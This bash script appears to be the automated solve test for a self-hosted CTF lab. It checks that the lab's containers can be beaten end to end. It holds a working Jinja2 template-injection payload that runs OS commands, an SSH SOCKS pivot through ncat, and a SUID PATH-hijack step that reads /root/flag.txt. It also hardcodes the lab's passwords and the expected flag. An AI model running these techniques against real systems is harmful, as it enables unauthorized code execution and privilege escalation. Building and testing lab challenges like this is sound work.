#!/usr/bin/env bash
# ============================================================================
#  solve.sh — automated golden-path regression test for the Ambiorix CTF.
#
#  Drives the FULL intended solution the way a player does: from the HOST,
#  against the published ports (no in-lab attacker box). Asserts the flag is
#  recovered. Run after `docker compose up -d --build`.
#
#  Needs on the host:  bash, curl, ssh, ncat (nmap-ncat / nc-openbsd), setsid.
#  No sshpass or proxychains required — passwords are fed via SSH_ASKPASS and
#  the SOCKS pivot uses ncat as the ProxyCommand.
#
#  Usage:
#     ./test/solve.sh
#     WEB=http://127.0.0.1:8080 SSH_PORT=2022 ./test/solve.sh   # override ports
# ============================================================================
set -u

WEB="${WEB:-http://127.0.0.1:8080}"     # published pivot web console
SSH_HOST="${SSH_HOST:-127.0.0.1}"       # published pivot SSH host
SSH_PORT="${SSH_PORT:-2022}"            # published pivot SSH port
SOCKS_PORT="${SOCKS_PORT:-1080}"        # local SOCKS port for the SSH -D tunnel

TARGET=10.10.10.10
EXPECTED='flag{atuatuca_ambush_54bc}'

WEB_USER=tiro;   WEB_PASS='AveLegioXIV-54'
SCOUT_PASS='FrontierWatch-54BC'
EBURO_PASS='ArduennaShadow'

SSHOPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

say() { printf '\n\033[1;33m[*] %s\033[0m\n' "$1"; }
ok()  { printf '\033[1;32m    OK: %s\033[0m\n' "$1"; }
die() { printf '\033[1;31m[!] FAIL: %s\033[0m\n' "$1"; cleanup; exit 1; }

# --- password-fed ssh without sshpass (SSH_ASKPASS + detached session) --------
ASKPASS="$(mktemp)"
printf '#!/bin/sh\necho "$PW"\n' > "$ASKPASS"; chmod +x "$ASKPASS"
# pssh PASSWORD -- ssh-args...   (runs ssh non-interactively with PASSWORD)
pssh() { local pw="$1"; shift; PW="$pw" SSH_ASKPASS="$ASKPASS" SSH_ASKPASS_REQUIRE=force \
         DISPLAY=:0 setsid -w ssh $SSHOPTS "$@"; }

TUN_PID=""
cleanup() {
  [ -n "$TUN_PID" ] && kill "$TUN_PID" 2>/dev/null
  rm -f "$ASKPASS" 2>/dev/null
}
trap cleanup EXIT

# ----------------------------------------------------------------------------
say "Stage 0 — isolation invariant: the target must NOT be reachable directly"
if ncat -z -w2 "$TARGET" 22 >/dev/null 2>&1; then
  die "reached $TARGET:22 directly from the host — the pivot is not enforced!"
fi
ok "target $TARGET is unreachable directly (as intended — only via the pivot)"

# ----------------------------------------------------------------------------
say "Stage 1 — foothold: log in + SSTI RCE -> recover scout SSH creds"
SSTI='{{ cycler.__init__.__globals__.os.popen("cat /opt/castra/DEPLOY_NOTES.txt").read() }}'
C="$(mktemp)"
curl -s -c "$C" -b "$C" -d "username=$WEB_USER&password=$WEB_PASS" "$WEB/login" -o /dev/null
curl -s -c "$C" -b "$C" --data-urlencode 'report=' --data-urlencode "sigil=$SSTI" "$WEB/board" \
  | grep -q "scout / $SCOUT_PASS" || die "SSTI RCE did not return the scout creds"
rm -f "$C"
ok "SSTI RCE works; deploy notes leak scout / $SCOUT_PASS + inner host $TARGET"

# ----------------------------------------------------------------------------
say "Stage 2 — pivot: read muster roll, then open an SSH -D SOCKS tunnel"
pssh "$SCOUT_PASS" -p "$SSH_PORT" "scout@$SSH_HOST" 'cat ~/muster.txt' 2>/dev/null \
  | grep -q "eburo / $EBURO_PASS" || die "could not read the inner-camp creds from scout's home"
ok "muster roll leaks eburo / $EBURO_PASS"

# Hold the SSH dynamic forward (SOCKS5 on 127.0.0.1:$SOCKS_PORT) open.
pssh "$SCOUT_PASS" -N -D "$SOCKS_PORT" -p "$SSH_PORT" "scout@$SSH_HOST" >/dev/null 2>&1 &
TUN_PID=$!
for _ in $(seq 1 10); do
  ncat -z -w1 127.0.0.1 "$SOCKS_PORT" >/dev/null 2>&1 && break; sleep 1
done
ncat -z -w1 127.0.0.1 "$SOCKS_PORT" >/dev/null 2>&1 \
  || die "SOCKS tunnel on :$SOCKS_PORT did not come up"
ok "SSH -D $SOCKS_PORT tunnel through castra is up (SOCKS5 127.0.0.1:$SOCKS_PORT)"

# ----------------------------------------------------------------------------
say "Stage 3 — inner objective: pivot to target, SUID PATH-hijack privesc"
# Plant a shebang-less 'date' script (run by /bin/sh inside the SUID binary);
# PATH hijack makes castellum execute it as root -> it cats the flag.
# ncat bridges ssh to the target through the SOCKS proxy (stand-in for proxychains).
PROXYCMD="ncat --proxy 127.0.0.1:$SOCKS_PORT --proxy-type socks5 %h %p"
RCMD='cd /tmp && echo "cat /root/flag.txt" > date && chmod +x date && PATH=/tmp:$PATH /usr/local/bin/castellum'
FLAG=$(pssh "$EBURO_PASS" -o "ProxyCommand=$PROXYCMD" "eburo@$TARGET" "$RCMD" 2>/dev/null \
       | grep -o 'flag{[^}]*}' | head -1)

# ----------------------------------------------------------------------------
say "Result"
echo "    recovered: '${FLAG:-<none>}'"
[ "${FLAG:-}" = "$EXPECTED" ] || die "flag mismatch (got '${FLAG:-<none>}', want '$EXPECTED')"
ok "golden path solved end-to-end — $EXPECTED"
printf '\n\033[1;32m==== PASS ====\033[0m\n'
